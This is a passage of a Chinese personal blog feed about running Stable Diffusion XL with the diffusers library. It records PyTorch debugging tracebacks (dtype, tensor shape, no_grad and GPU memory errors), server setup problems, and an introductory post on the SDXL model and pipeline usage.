class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16, variant=<span class="string">&quot;fp16&quot;</span>, use_safetensors=True</span><br><span class="line">)</span><br><span class="line">pipe.unet = UNet2DConditionModel(**unet_config).from_pretrained(cfg.general.model_path, subfolder=<span class="string">&quot;unet&quot;</span>)</span><br><span class="line">pipe.to(<span class="string">&quot;cuda:0&quot;</span>)</span><br></pre></td></tr></table></figure><p>成功解决。</p><h2 id="4-4-Error-4"><a href="#4-4-Error-4" class="headerlink" title="4.4 Error 4"></a>4.4 Error 4</h2><p>成功初始化之后，遇到数据类型不同，完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Error executing job with overrides: [<span class="string">&#x27;general.save_path=./example_output&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/inference_xl.py&quot;</span>, line 73, <span class="keyword">in</span> main</span><br><span class="line">    pil_images = pipe(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/utils/_contextlib.py&quot;</span>, line 116, <span class="keyword">in</span> decorate_context</span><br><span class="line">    <span class="built_in">return</span> func(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/sdxl.py&quot;</span>, line 1224, <span class="keyword">in</span> __call__</span><br><span class="line">    self.unet(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1553, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="built_in">return</span> self._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1562, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="built_in">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/my_model/unet_2d_condition_xl.py&quot;</span>, line 1146, <span class="keyword">in</span> forward</span><br><span class="line">    emb = self.time_embedding(t_emb, timestep_cond)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1553, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="built_in">return</span> self._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1562, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="built_in">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/diffusers/models/embeddings.py&quot;</span>, line 579, <span class="keyword">in</span> forward</span><br><span class="line">    sample = self.linear_1(sample)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1553, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="built_in">return</span> self._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1562, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="built_in">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/linear.py&quot;</span>, line 117, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="built_in">return</span> F.linear(input, self.weight, self.bias)</span><br><span class="line">RuntimeError: mat1 and mat2 must have the same dtype, but got Half and Float</span><br></pre></td></tr></table></figure><p>可以在变量的后面加上<code>.float()</code>，得以解决。</p><h2 id="4-5-Error-5"><a href="#4-5-Error-5" class="headerlink" title="4.5 Error 5"></a>4.5 Error 5</h2><p>上面的错误解决后，报了以下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/my_model/unet_2d_blocks_xl.py&quot;</span>, line 1288, <span class="keyword">in</span> forward</span><br><span class="line">    hidden_states = resnet(hidden_states, temb)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1553, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="built_in">return</span> self._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1562, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="built_in">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/diffusers/models/resnet.py&quot;</span>, line 327, <span class="keyword">in</span> forward</span><br><span class="line">    hidden_states = self.norm1(hidden_states)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1553, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="built_in">return</span> self._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line 1562, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="built_in">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/normalization.py&quot;</span>, line 288, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="built_in">return</span> F.group_norm(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/functional.py&quot;</span>, line 2606, <span class="keyword">in</span> group_norm</span><br><span class="line">    <span class="built_in">return</span> torch.group_norm(input, num_groups, weight, bias, eps, torch.backends.cudnn.enabled)</span><br><span class="line">RuntimeError: Expected weight to be a vector of size equal to the number of channels <span class="keyword">in</span> input, but got weight of shape [640] and input of shape [640, 64, 64]</span><br></pre></td></tr></table></figure><p>可能形状出现了问题？先把输入的形状打印出来看看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hidden_states.shape: torch.Size([2, 640, 64, 64])</span><br></pre></td></tr></table></figure><p>后来不知道怎么就解决了…</p><h2 id="4-6-Error-6"><a href="#4-6-Error-6" class="headerlink" title="4.6 Error 6"></a>4.6 Error 6</h2><p>之后在Unet的up部分又出现了以下报错，马上就要全部解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/my_model/unet_2d_condition_xl.py&quot;</span>, line <span class="number">1285</span>, <span class="keyword">in</span> forward</span><br><span class="line">    sample, cross_atten_prob = upsample_block(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line <span class="number">1553</span>, <span class="keyword">in</span> _wrapped_call_impl</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>._call_impl(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/nn/modules/module.py&quot;</span>, line <span class="number">1562</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/my_model/unet_2d_blocks_xl.py&quot;</span>, line <span class="number">2529</span>, <span class="keyword">in</span> forward</span><br><span class="line">    hidden_states = torch.cat([hidden_states, res_hidden_states], dim=<span class="number">1</span>)</span><br><span class="line">RuntimeError: Tensors must have same number of dimensions: got <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>打印相关变量的形状如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hidden_states.shape: torch.Size([1280, 32, 32])</span><br><span class="line">res_hidden_states.shape: torch.Size([2, 1280, 32, 32])</span><br></pre></td></tr></table></figure><p>可以看到形状不一样，但是我不知道哪个形状出了问题。</p><p>发现问题了，是注意力计算的结果应该是2个，但是我只接收了一个。</p><h2 id="4-7-Error-7"><a href="#4-7-Error-7" class="headerlink" title="4.7 Error 7"></a>4.7 Error 7</h2><p>最后计算得到<code>loss</code>对<code>latents</code>计算梯度的时候报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/sdxl.py&quot;</span>, line 1263, <span class="keyword">in</span> __call__</span><br><span class="line">    grad_cond = torch.autograd.grad(loss.requires_grad_(True), [latents])[0]</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/autograd/__init__.py&quot;</span>, line 436, <span class="keyword">in</span> grad</span><br><span class="line">    result = _engine_run_backward(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/autograd/graph.py&quot;</span>, line 768, <span class="keyword">in</span> _engine_run_backward</span><br><span class="line">    <span class="built_in">return</span> Variable._execution_engine.run_backward(  <span class="comment"># Calls into the C++ engine to run the backward pass</span></span><br><span class="line">RuntimeError: One of the differentiated Tensors appears to not have been used <span class="keyword">in</span> the graph. Set allow_unused=True <span class="keyword">if</span> this is the desired behavior.</span><br></pre></td></tr></table></figure><p>就是说在计算过程中有一个或多个需要求导的 Tensor 并没有在计算的图中被使用。应该确保 <code>loss</code> 是依赖于 <code>latents</code> 的。如果 <code>loss</code> 的计算与 <code>latents</code> 无关，那么对 <code>latents</code> 求梯度就没有意义，因为梯度将会是零或者未定义。</p><p>这里相关的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用自动求导机制计算损失对 latents 的梯度</span></span><br><span class="line">grad_cond = torch.autograd.grad(loss.requires_grad_(<span class="literal">True</span>), [latents])[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>打印<code>loss</code>结果是有数值的，所以估计<code>loss</code>的计算过程和<code>latent</code>没有关系？但是按理来说应该是有关系的。</p><p>现在应该怎么去解决这个错误？我觉得还是先看一下原来正确的代码运行结果应该是怎么样的。</p><p>运行了一下原来的代码，为什么之前的打印latent_model_input。requires_grad就是True呢？</p><p>最后发现竟然是运行的这个函数开始设置了不需要梯度，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="meta">@replace_example_docstring(<span class="params">EXAMPLE_DOC_STRING</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    vae,</span></span><br><span class="line"><span class="params">    tokenizer,</span></span><br><span class="line"><span class="params">    text_encoder,</span></span><br></pre></td></tr></table></figure><p>无语了，以后就知道注意这个问题了。</p><h2 id="4-8-Error-8"><a href="#4-8-Error-8" class="headerlink" title="4.8 Error 8"></a>4.8 Error 8</h2><p>GPU的显存不够，报OOM，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">torch.OutOfMemoryError: CUDA out of memory. </span><br><span class="line">Tried to allocate <span class="number">160.00</span> MiB. GPU <span class="number">0</span> has a total capacity of <span class="number">23.60</span> GiB of which <span class="number">132.50</span> MiB <span class="keyword">is</span> free. </span><br><span class="line">Including non-PyTorch memory, this process has <span class="number">23.44</span> GiB memory <span class="keyword">in</span> use. </span><br><span class="line">Of the allocated memory <span class="number">22.79</span> GiB <span class="keyword">is</span> allocated by PyTorch, <span class="keyword">and</span> <span class="number">351.34</span> MiB <span class="keyword">is</span> reserved by PyTorch but unallocated. </span><br><span class="line">If reserved but unallocated memory <span class="keyword">is</span> large <span class="keyword">try</span> setting PYTORCH_CUDA_ALLOC_CONF=expandable_segments:<span class="literal">True</span> to avoid fragmentation.  </span><br><span class="line">See documentation <span class="keyword">for</span> Memory Management  (https://pytorch.org/docs/stable/notes/cuda.html<span class="comment">#environment-variables)</span></span><br></pre></td></tr></table></figure><p>做推理的时候由于FFM的维度太大了，24G的显存不够，我换了32G也不够，主要是因为layout中需要保留梯度，所以在sdxl计算过程中和latent相关的变量都需要保存下来。</p><hr><h1 id="5-服务器配置报错"><a href="#5-服务器配置报错" class="headerlink" title="5 服务器配置报错"></a>5 服务器配置报错</h1><h2 id="5-1-update时不能连接docker-com"><a href="#5-1-update时不能连接docker-com" class="headerlink" title="5.1 update时不能连接docker.com"></a>5.1 update时不能连接docker.com</h2><p>问题描述：在使用<code>sudo apt-get update</code>命令时，无法连接到<code>download.docker.com</code>，完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Err:10 https://download.docker.com/linux/ubuntu focal InRelease                                                                                                                             </span><br><span class="line">  Cannot initiate the connection to download.docker.com:443 (2001::caa0:8010). - connect (101: Network is unreachable) Could not connect to download.docker.com:443 (108.160.167.30), connection timed out</span><br><span class="line">Reading package lists... Done                           </span><br><span class="line">W: Failed to fetch https://download.docker.com/linux/ubuntu/dists/focal/InRelease  Cannot initiate the connection to download.docker.com:443 (2001::caa0:8010). - connect (101: Network is unreachable) Could not connect to download.docker.com:443 (108.160.167.30), connection timed out</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure><p>之后其实也没有解决，因为主要想安装<code>gpustat</code>，但是后来装好<code>conda</code>环境之后，<code>gpustat</code>就有了，也不知道为什么。</p><h2 id="5-2-空间不足"><a href="#5-2-空间不足" class="headerlink" title="5.2 空间不足"></a>5.2 空间不足</h2><p>安装torch的时候显示磁盘空间不足，完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not install packages due to an OSError: </span><br><span class="line">[Errno 28] No space left on device: <span class="string">&#x27;/home/zql/.local/lib/python3.8/site-packages/mpmath&#x27;</span></span><br></pre></td></tr></table></figure><p>需要释放一些空间。</p>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 夏令营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年西交多媒体小组考核任务1</title>
      <link href="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/"/>
      <url>/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/</url>
      
        <content type="html"><![CDATA[<h1 id="1-任务要求"><a href="#1-任务要求" class="headerlink" title="1 任务要求"></a>1 任务要求</h1><p><a href="https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0" title="   https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0">   https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0</a></p><ul><li>学会使用<code>Diffusers</code>包调用<code>StableDiffusionXL</code>生成图片</li></ul><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_c2eZdaKJ7W.png"></p><h1 id="2-模型结构"><a href="#2-模型结构" class="headerlink" title="2 模型结构"></a>2 模型结构</h1><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image__ACAkcfsrS.png"></p><p>SDXL 由一组用于潜在扩散的专家管道组成：在第一步中，基本模型用于生成（嘈杂的）潜伏物，然后使用专门用于最终去噪步骤的细化模型（可在此处获得：<a href="https://huggingface.co/stabilityai/stable-diffusion-xl-refiner-1.0/%EF%BC%89%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%A4%84%E7%90%86%E3%80%82%E8%AF%B7%E6%B3%A8%E6%84%8F%EF%BC%8C%E5%9F%BA%E6%9C%AC%E6%A8%A1%E5%9E%8B%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%BD%9C%E7%8B%AC%E7%AB%8B%E6%A8%A1%E5%9D%97%E3%80%82" title="https://huggingface.co/stabilityai/stable-diffusion-xl-refiner-1.0/）对其进行进一步处理。请注意，基本模型可以用作独立模块。">https://huggingface.co/stabilityai/stable-diffusion-xl-refiner-1.0/）对其进行进一步处理。请注意，基本模型可以用作独立模块。</a></p><p>或者，我们可以使用两阶段流水线，如下所示：首先，使用基本模型生成所需输出大小的潜伏。在第二步中，我们使用专门的高分辨率模型，并使用相同的提示将一种称为 SDEdit （https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2108.01073，也称为“img2img”）的技术应用于第一步中生成的潜伏物。这种技术比第一种技术稍慢，因为它需要更多的功能评估。</p><p>源代码可在 https:&#x2F;&#x2F;github.com&#x2F;Stability-AI&#x2F;generative-models 上获得。</p><hr><h1 id="3-模型介绍"><a href="#3-模型介绍" class="headerlink" title="3 模型介绍"></a>3 模型介绍</h1><ul><li>开发者：Stability AI</li><li>模型类型：基于扩散的文本到图像生成模型</li><li>模型说明：这是一个可用于根据文本提示生成和修改图像的模型。它是一种潜在扩散模型，使用两个固定的、预训练的文本编码器（OpenCLIP-ViT&#x2F;G 和 CLIP-ViT&#x2F;L）。</li></ul><h2 id="3-1-模型源"><a href="#3-1-模型源" class="headerlink" title="3.1 模型源"></a>3.1 模型源</h2><p>出于研究目的，推荐 <code>generative-models</code> Github 存储库 （ https:&#x2F;&#x2F;github.com&#x2F;Stability-AI&#x2F;generative-models），它实现了最流行的扩散框架（训练和推理），并且随着时间的推移将添加蒸馏等新功能。Clipdrop 提供免费的 SDXL 推理。</p><ul><li>仓库：<a href="https://github.com/Stability-AI/generative-models" title="https://github.com/Stability-AI/generative-models">https://github.com/Stability-AI/generative-models</a></li><li>演示：<a href="https://clipdrop.co/stable-diffusion" title="https://clipdrop.co/stable-diffusion">https://clipdrop.co/stable-diffusion</a></li></ul><h2 id="3-2-评估"><a href="#3-2-评估" class="headerlink" title="3.2 评估"></a>3.2 评估</h2><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_GrzDL31bGv.png"></p><p>上图评估了用户对 SDXL（有和没有改进）的偏好，而不是 SDXL 0.9 和 Stable Diffusion 1.5 和 2.1。SDXL 基本模型的性能明显优于以前的变体，并且该模型与细化模块相结合，可实现最佳的整体性能。</p><hr><h1 id="4-Pipeline的使用"><a href="#4-Pipeline的使用" class="headerlink" title="4 Pipeline的使用"></a>4 Pipeline的使用</h1><h2 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h2><p>pipeline()是使用预训练模型进行推理的最简单、最快的方法。可以将 pipeline() 开箱即用地用于不同模式的许多任务，其中一些任务如下表所示：</p><table><thead><tr><th><strong>Task</strong></th><th><strong>Description</strong></th><th><strong>Modality</strong></th><th><strong>Pipeline identifier</strong></th></tr></thead><tbody><tr><td>Text classification</td><td>assign a label to a given sequence of text</td><td>NLP</td><td>pipeline(task&#x3D;“sentiment-analysis”)</td></tr><tr><td>Text generation</td><td>generate text given a prompt</td><td>NLP</td><td>pipeline(task&#x3D;“text-generation”)</td></tr><tr><td>Summarization</td><td>generate a summary of a sequence of text or document</td><td>NLP</td><td>pipeline(task&#x3D;“summarization”)</td></tr><tr><td>Image classification</td><td>assign a label to an image</td><td>CV</td><td>pipeline(task&#x3D;“image-classification”)</td></tr><tr><td>Image segmentation</td><td>assign a label to each individual pixel of an image (supports semantic, panoptic, and instance segmentation)</td><td>CV</td><td>pipeline(task&#x3D;“image-segmentation”)</td></tr><tr><td>Object detection</td><td>predict the bounding boxes and classes of objects in an image</td><td>CV</td><td>pipeline(task&#x3D;“object-detection”)</td></tr><tr><td>Audio classification</td><td>assign a label to some audio data</td><td>Audio</td><td>pipeline(task&#x3D;“audio-classification”)</td></tr><tr><td>Automatic speech recognition</td><td>transcribe speech into text</td><td>Audio</td><td>pipeline(task&#x3D;“automatic-speech-recognition”)</td></tr><tr><td>Visual question answering</td><td>answer a question about the image, given an image and a question</td><td>Multimodal</td><td>pipeline(task&#x3D;“vqa”)</td></tr><tr><td>Document question answering</td><td>answer a question about the document, given a document and a question</td><td>Multimodal</td><td>pipeline(task&#x3D;“document-question-answering”)</td></tr><tr><td>Image captioning</td><td>generate a caption for a given image</td><td>Multimodal</td><td>pipeline(task&#x3D;“image-to-text”)</td></tr></tbody></table><p>首先创建一个 pipeline()实例并指定要使用它的任务。使用 pipeline() 进行情绪分析作为示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> pipeline</span><br><span class="line">classifier = pipeline(<span class="string">&quot;sentiment-analysis&quot;</span>)</span><br><span class="line">classifier(<span class="string">&quot;We are very happy to show you the 🤗 Transformers library.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-2-在管道中使用另一个模型和分词器"><a href="#4-2-在管道中使用另一个模型和分词器" class="headerlink" title="4.2 在管道中使用另一个模型和分词器"></a>4.2 在管道中使用另一个模型和分词器</h2><p>pipeline()可以容纳 Hub 中的任何模型，从而可以轻松地将 pipeline()调整为其他用例。例如，如果想要一个能够处理法语文本的模型，请使用中心上的标记筛选适当的模型。顶部筛选结果返回一个多语言 BERT 模型，该模型针对可用于法语文本的情感分析进行了微调：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">model_name = <span class="string">&quot;nlptown/bert-base-multilingual-uncased-sentiment&quot;</span></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForSequenceClassification</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(model_name)</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(model_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 pipeline()中指定 <code>model</code>和 <code>tokenizer</code>，现在可以在法语文本上应用： <code>classifier</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classifier = pipeline(<span class="string">&quot;sentiment-analysis&quot;</span>, model=model, tokenizer=tokenizer)</span><br><span class="line">classifier(<span class="string">&quot;Nous sommes très heureux de vous présenter la bibliothèque 🤗 Transformers.&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="5-模型部署"><a href="#5-模型部署" class="headerlink" title="5 模型部署"></a>5 模型部署</h1><p>将diffusers升级到 &gt;&#x3D; 0.19.0：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install diffusers --upgrade</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，安装 <code>transformers</code> 、 <code>safetensors</code> 、 <code>accelerate</code> 以及不可见的水印：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install invisible_watermark transformers accelerate safetensors</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>若要仅使用基本模型，可以运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DiffusionPipeline</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipe = DiffusionPipeline.from_pretrained(<span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16, use_safetensors=<span class="literal">True</span>, variant=<span class="string">&quot;fp16&quot;</span>)</span><br><span class="line">pipe.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if using torch &lt; 2.0</span></span><br><span class="line"><span class="comment"># pipe.enable_xformers_memory_efficient_attention()</span></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&quot;An astronaut riding a green horse&quot;</span></span><br><span class="line"></span><br><span class="line">images = pipe(prompt=prompt).images[<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码解释如下：</p><ul><li><code>pipe = DiffusionPipeline.from_pretrained(...)</code> 初始化了一个扩散模型管道，使用 <code>DiffusionPipeline</code> 类。</li><li><code>from_pretrained</code> 表明模型从预训练的检查点加载。</li><li><code>&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</code> 是要加载的预训练模型的标识符或名称。</li><li><code>torch_dtype=torch.float16</code> 指定模型应使用 <code>torch.float16</code>（半精度浮点数）张量。</li><li><code>use_safetensors=True</code> 表示应使用安全张量（可能具有额外的安全检查或功能）。</li><li><code>variant=&quot;fp16&quot;</code> 指定模型变体基于浮点16位精度 (<code>fp16</code>)。</li></ul><p>之后将整个流水线移到GPU上，并且提示词“一位骑着绿马的宇航员”，将其作为模型输入，之后输出生成的第一个图像。</p><p>运行结果如下，正在下载文件中：</p><p><img src="/2024/08/16/2024%E5%B9%B4%E8%A5%BF%E4%BA%A4%E5%A4%9A%E5%AA%92%E4%BD%93%E5%B0%8F%E7%BB%84%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_sh_RUmIo_F.png"></p><p>To use the whole base + refiner pipeline as an ensemble of experts you can run:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 